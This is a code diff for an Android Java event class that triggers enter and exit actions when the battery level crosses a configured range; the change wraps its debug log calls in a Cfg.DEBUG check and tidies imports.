@@ -14,9 +14,8 @@ import java.io.IOException;
 import android.util.Log;
 
 import com.android.service.Battery;
-import com.android.service.Status;
+import com.android.service.auto.Cfg;
 import com.android.service.interfaces.Observer;
-import com.android.service.listener.ListenerAc;
 import com.android.service.listener.ListenerBattery;
 import com.android.service.util.DataBuffer;
 
@@ -51,9 +50,9 @@ public class EventBattery extends EventBase implements Observer<Battery> {
 			minLevel = databuffer.readInt();
 			maxLevel = databuffer.readInt();
 			
-			Log.d("QZ", TAG + " exitAction: " + actionOnExit + " minLevel:" + minLevel + " maxLevel:" + maxLevel);
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " exitAction: " + actionOnExit + " minLevel:" + minLevel + " maxLevel:" + maxLevel);
 		} catch (final IOException e) {
-			Log.d("QZ", TAG + " Error: params FAILED");
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " Error: params FAILED");
 			return false;
 		}
 		return true;
@@ -65,7 +64,7 @@ public class EventBattery extends EventBase implements Observer<Battery> {
 	}
 
 	public int notification(Battery b) {
-		Log.d("QZ", TAG + " Got battery notification: " + b.getBatteryLevel() + "%");
+		if(Cfg.DEBUG) Log.d("QZ", TAG + " Got battery notification: " + b.getBatteryLevel() + "%");
 		
 		if (minLevel > maxLevel)
 			return 0;
@@ -73,14 +72,14 @@ public class EventBattery extends EventBase implements Observer<Battery> {
 		// Nel range
 		if ((b.getBatteryLevel() >= minLevel && b.getBatteryLevel() <= maxLevel) && inRange == false) {
 			inRange = true;
-			Log.d("QZ", TAG + " Battery IN");
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " Battery IN");
 			onEnter();
 		}
      
 		// Fuori dal range
 		if ((b.getBatteryLevel() < minLevel || b.getBatteryLevel() > maxLevel) && inRange == true) {
 			inRange = false;
-			Log.d("QZ", TAG + " Battery OUT");
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " Battery OUT");
 			onExit();
 		}
 		
